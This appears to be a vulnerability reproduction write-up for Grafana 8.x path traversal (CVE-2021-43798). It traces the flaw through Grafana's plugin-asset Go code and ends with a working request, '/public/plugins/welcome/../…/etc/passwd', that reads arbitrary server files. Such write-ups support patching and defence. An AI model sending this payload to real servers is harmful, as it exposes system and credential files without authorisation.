# Grafana plugins arbitrary file reading vulnerability CVE-2021-43798

## Vulnerability Description

Grafana has a random file reading vulnerability. Through the default plug-in, a special request package can be constructed to read any file on the server.

## Vulnerability Impact

<span style="background-color:rgb(18, 160, 255); padding: 2px 4px; border-radius: 3px; color: white;">Grafana 8.x</span>

## Network surveying and mapping



## Vulnerability reappears

Login page

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1638885570573-25d2b257-36c8-43a7-bf8f-f552193f6649.png)

Download the source code for local analysis

```php
https://codeload.github.com/grafana/grafana/zip/refs/tags/v8.3.0
```

Find the request path in api.go based on the vulnerability

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1638885654432-3d019c1a-81fd-429d-9667-6c1e829b694e.png)

```php
r.Get("/public/plugins/:pluginId/*", hs.getPluginAssets)
```

Track the corresponding getPluginAssets method

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1638885718491-08933f1d-ee0f-4eaa-b5d7-859c4889d2b7.png)

The parameters after obtaining `/public/plugins/` from the request path are assigned to `pluginID,` and then splicing them to `pluginFilePath` to enter the file to read the fragment

```go
requestedFile := filepath.Clean(web.Params(c.Req)["*"])
pluginFilePath := filepath.Join(plugin.PluginDir, requestedFile)
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1638886241407-a47b7e8e-47fb-4481-8719-c532b51a5fa0.png)

That is to say, the file path construct request is spliced ​​through the default plug-in to read the file.

```go
plugin, exists := hs.pluginStore.Plugin(c.Req.Context(), pluginID)
if !exists {
		c.JsonApiErr(404, "Plugin not found", nil)
		return
	}
```

Plugin path `public/app/plugins/panel`

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1638886549610-16b0f045-996a-4e0d-86db-4b6c83a3a989.png)

Construct request

```go
/public/plugins/welcome/../../../../../../../../../etc/passwd
```

![img](https://raw.githubusercontent.com/PeiQi0/PeiQi-WIKI-Book/refs/heads/main/docs/.vuepress/../.vuepress/public/img/1638886726559-aa047e67-0bca-4b8c-bb07-4a9af6226e6e.png)